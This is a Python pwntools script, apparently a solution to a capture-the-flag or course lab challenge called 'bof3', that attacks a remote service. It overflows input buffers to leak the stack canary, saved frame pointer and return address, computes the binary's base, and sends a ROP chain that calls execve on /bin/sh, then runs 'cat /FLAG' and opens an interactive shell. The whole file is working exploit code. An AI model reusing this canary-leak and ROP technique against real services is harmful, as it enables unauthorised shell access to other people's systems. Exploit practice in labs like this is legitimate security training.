#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys
# from pwn import p64, u64

context.arch = 'amd64'
context.os = 'linux'

exe = './challenges/bof3'
port = 10261

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)


######################################### nWhat's your name? 


r.recvuntil(b'name? ')
payloads = b'A' * 40

# pause()

r.send(payloads + b'B')
z = r.recvline()
print(">>> rec1: ", z)
canery = z.split(payloads)[1][1:8]
hex_canery = hex(u64(canery.ljust(8, b'\x00')))
canery =  b'\x00' + canery
print(">>> canery", canery)
print(">>> hex_canery", hex_canery)

rbp_addr = z.split(payloads)[1][8:-1]
hex_rbp_addr = hex(u64(rbp_addr.ljust(8, b'\x00')))
print(">>> rbp_addr", rbp_addr)
print(">>> hex_rbp_addr", hex_rbp_addr)

######################################### nWhat's the room number?

# pause()

r.recvuntil(b'number? ')
payloads = b'A' * 40 + b'B' * 16
r.send(payloads)
z = r.recvline()
print("\n\n>>> rec2: ", z)

return_addr = z.split(payloads)[1][0:-1]
hex_return_addr = hex(u64(return_addr.ljust(8, b'\x00')))
print(">>> return_addr", return_addr)
print(">>> hex_return_addr", hex_return_addr)

######################################### 3. nWhat's the customer's name?
r.recvuntil(b'name? ')
payloads = b'A' * 40

msg = 0xd31e0       # 00000000000d31e0 <msg> in bss
main = 0x8b07       # 8b07 <main+0xa0> (0x8a67 + 0xa0)
msg_ptr = int(hex_return_addr, 16) - main + msg
# print(">>> send: ", payloads + canery + b'B' * 8 + p64(msg_ptr))

# pause()

r.send(payloads)
z = r.recvline()
print("\n\n>>> rec3: ", z)

######################################### 4. Leave your message: 
rsp_addr = int(hex_rbp_addr, 16) - 0x40
base = int(hex_return_addr, 16) - 0x8ad0

syscall = 0x0000000000008f34 + base
pop_rax_ret = 0x0000000000057187 + base       # pop rax ; ret
pop_rdi_ret = 0x000000000000917f + base       # pop rdi ; ret
pop_rsi_ret = 0x00000000000111ee + base       # pop rsi ; ret
pop_rdx = 0x000000000008dd8b + base           # pop rdx ; pop rbx ; ret
fifty_nine = 0x3b

# %rax	System call   %rdi	          %rsi                %rdx
# 59	sys_execve	  char *filename  char *const argv[]  char *const envp[]
# 59                  /bin/sh         0                   0

bin_sh_bytes = p64(0x0068732f6e69622f)

# payloads = pop_rax_ret + p64(fifty_nine) + pop_rdi_ret + bin_sh_bytes + canery + b'B' * 8 + p64(rsp_addr)
print(">>> p64(syscall): ", hex(syscall))
payloads = bin_sh_bytes +  b'A' * 32  + canery + b'B' * 8 + p64(pop_rdi_ret) + p64(rsp_addr)  + p64(pop_rsi_ret) + b'\0' * 8 + p64(pop_rdx) + b'\0' * 16 + p64(pop_rax_ret) + p64(0x3b) + p64(syscall)

print(">>> last payloads: ", payloads)
print(len(payloads))
r.send(payloads)

# r.interactive()

r.send(b'cat /FLAG\n')
print(r.recv())

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :